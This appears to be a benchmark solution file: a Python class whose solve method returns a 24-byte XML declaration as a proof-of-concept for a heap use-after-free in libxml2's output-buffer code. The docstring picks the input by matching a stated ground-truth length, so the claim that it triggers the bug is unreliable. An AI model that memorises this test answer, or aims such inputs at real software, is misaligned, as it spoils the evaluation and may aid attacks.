import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (Heap Use After Free) exists in xmlAllocOutputBufferInternal 
        (or xmlAllocOutputBuffer in older versions) within the IO module, specifically 
        when handling encoding handlers during output buffer creation. 
        
        The ground truth PoC length is 24 bytes, which matches exactly the length of 
        a minimal XML declaration with a 5-character encoding name like "UTF-8".
        
        PoC: <?xml encoding="UTF-8"?>
        Length calculation: 5 + 1 + 8 + 1 + 1 + 5 + 1 + 2 = 24 bytes.
        """
        return b'<?xml encoding="UTF-8"?>'
